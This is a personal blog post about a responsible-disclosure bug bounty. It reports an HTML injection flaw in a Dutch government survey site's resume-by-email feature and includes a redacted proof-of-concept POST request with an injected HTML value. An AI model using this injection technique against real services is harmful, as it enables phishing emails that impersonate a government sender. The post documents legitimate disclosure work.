---
title: "I hacked the Dutch government and all I got was this lousy t-shirt"
date: 2023-11-02T23:25:14+01:00
toc: false
image:
  - /images/dutch_government_bounty/tshirt.jpeg
images:
  - /images/dutch_government_bounty/tshirt.jpeg
  - /images/dutch_government_bounty/poc.png
tags:
  - Bug Bounty
---

Recently, I was awarded a cool t-shirt from the **Dutch government** for disclosing and reporting a vulnerability under their **National Cyber Security Centre** [responsible disclosure program](https://www.government.nl/topics/cybercrime/fighting-cybercrime-in-the-netherlands/responsible-disclosure).

| ![Lousy t-shirt](/images/dutch_government_bounty/tshirt.jpeg#center) |
| :-------------------------------------------------: |
|                  Lousy t-shirt                  |

I was able to discover a vulnerability in one of the government's websites. 
The platform allows users to compile a survey and offers the possibility to save progress and receive a link via email to resume the it in a second time. 

Testing this functionality I was able to find the parameter responsible for setting the URL to resume the survey in a POST request. This parameter was also not subject to sanification, and so it was possible to inject HTML code into email sent from `noreply@[governmentdomain].nl` effectively allowing unauthenticated users to send emails with forged contents to arbitrary addresses, impersonating the Dutch government. 

As a proof of concept, consider this POST request:
```http
POST /[endpoint] HTTP/1.1
Host: [governmentdomain].nl
User-Agent: Mozilla/5.0(X11; Linux x86_64; rv: 108.0) Gecko/20100101 Firefox/108.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: [...]
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 191
Origin: https://[governmentdomain].nl
Connection: keep-alive
Cookie: [...]
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Pragma: no-cache
Cache-Control: no-cache

[...]
link=https%3A%2F%2Fexample.org<h1>hack</h1>
[...]
```

With the received email looking like this:

| ![poc email](/images/dutch_government_bounty/poc.png#center) |
| :-------------------------------------------------: |
|                  PoC email with injected HTML code                |

At this point I stopped testing in accordance to the rules of the responsible disclosure program and reported the issue.   

Thanks to the Dutch National Cyber Security Centre for promptly fixing the issue and awarding me the t-shirt. It's great to see a government taking proactive steps towards improving their cybersecurity posture and promoting responsible disclosure.

